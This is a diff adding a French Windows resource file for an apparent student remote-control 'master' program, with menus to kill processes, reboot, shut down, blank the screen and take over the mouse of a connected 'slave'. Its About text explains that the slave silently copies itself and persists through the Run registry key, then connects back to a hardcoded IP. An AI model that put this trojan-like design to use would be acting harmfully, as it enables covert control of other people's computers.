@@ -1,0 +1,54 @@
+#include <windows.h>
+#include "ressources.h"
+ACCUEIL_MENU MENU
+BEGIN
+
+   POPUP "Fichier"
+   BEGIN
+        MENUITEM "Connecter",ID_B_CONNECT
+        MENUITEM SEPARATOR
+        MENUITEM "Quitter",ID_B_QUIT
+    END
+
+    POPUP "Processus"
+    BEGIN
+        MENUITEM "Lister les processus",ID_B_PID
+        MENUITEM "Arreter le processus",ID_B_KILL
+    END
+
+    POPUP "Redémarrage"
+    BEGIN
+        MENUITEM "Fermer la session",ID_B_LOGOFF
+        MENUITEM "Redemarrer",ID_B_REBOOT
+        MENUITEM "Arrêter",ID_B_SHUTDOWN
+        MENUITEM "Mise en veille",ID_B_SLEEP
+    END
+
+    POPUP "Funs"
+    BEGIN
+        MENUITEM "Wizzer la fenêtre active",ID_B_WIZZ
+        MENUITEM "Fermer la fenêtre active",ID_B_CLOSE
+        MENUITEM "Eteindre l'écran",ID_B_SCREENOFF
+        MENUITEM SEPARATOR
+        MENUITEM "Contrôler la souris",ID_B_CONTROLMOUSE
+        MENUITEM "Arrêter le Contrôle",ID_B_STOPCONTROLMOUSE
+    END
+
+    POPUP "Aide"
+    BEGIN
+        MENUITEM "Apropos",ID_DIALOG_APROPOS
+    END
+
+END
+APROPOS DIALOG
+    //x,y,Width,Height
+    CW_USEDEFAULT, CW_USEDEFAULT, 300, 150
+    //Style
+    STYLE WS_OVERLAPPEDWINDOW
+    //Title
+    CAPTION "Apropos"
+        BEGIN
+            //MOTCLE TEXTE_ASSOCIE, ID, x, y, w, h, STYLES
+            LTEXT "Cette application a été développée dans le cadre de la validation de ma 3ème année au sein de l'école PPA, sous l'encadrement de Mr.Alexandre MESLE. Avant de lancer cette application merci de s'assurer que l'adresse IP mentionnée en tant qu'argument de la fonction SetStruct dans le main.c du SlaveFinal correspond à votre adresse IP, sinon vous risquerrez de vous connecter à mon master,Si vous êtes sous windows XP en executant le SlaveFinal.exe, l'exécutable se place automatiquement dans c:/Documents and Settings ,ensuite cette application s'installe automatiquement en ajoutant le chemin de l'executable dans la base de registre, pour la désinstaller il suffit de supprimer cette clé dans la base de registre 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'.\n Hossam LAANAIT", -1, 30, 10, 250, 100
+
+        END
